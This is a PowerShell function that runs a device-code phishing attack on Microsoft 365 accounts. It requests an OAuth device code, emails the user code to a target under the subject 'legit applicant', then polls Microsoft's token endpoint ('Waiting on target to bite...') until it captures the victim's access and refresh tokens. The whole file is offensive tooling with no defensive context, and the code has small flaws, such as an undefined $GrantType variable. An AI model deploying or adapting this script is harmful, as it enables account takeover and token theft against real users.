function Get-UserDeviceToken {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$AppSecret,

        [Parameter(Mandatory = $true)]
        [string]$Sender,

        [string]$Target,

        [string]$ClientID,

        [string]$TenantId,
    )

    $auth_body = @{
        "client_id" = $ClientID
        "scope" = '.default offline_access'
    }

    $auth_params = @{
        "Method" = 'Post'
        "Uri" = "https://login.microsoftonline.com/$($TenantID)/oauth2/v2.0/devicecode"
        "Body" = $auth_body
    }

    $authResponse = Invoke-RestMethod -UseBasicParsing @auth_params

    $authResponse

    $email_params = @{
        From = $Sender
        To = $Target 
        Subject = "legit applicant"
        Body = $authResponse.user_code
        SmtpServer = "smtp.gmail.com"
        Port = '587'
        Credential = $(New-Object System.Management.Automation.PSCredential($Sender, $(ConvertTo-SecureString $AppSecret -AsPlainText -Force)))
    }

    Send-MailMessage @email_params -UseSsl

    Write-Host "Email sent to $($Target):" -ForegroundColor Green
    $email_params | Out-String | Write-Host -ForegroundColor Green

    $body = @{
        "client_id" = $CLientID
        "grant_type" = $GrantType
        "code" = $authResponse.device_code
    }

    $params = @{
        "Method" = 'Post'
        "Uri" = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
        "Body" = $body 
    }

    $count = 0
    do {
        $failed = $false        
        try {
            $Tokens = Invoke-RestMethod -UseBasicParsing @params
        } catch {
            if ($count -lt 1) {
                 
                Write-Host "Error: $_" -ForegroundColor Red
                Write-Host "`nWaiting on target to bite..."
            }
            $failed = $true
            $count++
        }
    } while ($failed) 

    Write-Host "We got a bite!`n" -ForegroundColor Green
    Write-Host $Tokens -ForegroundColor Green
}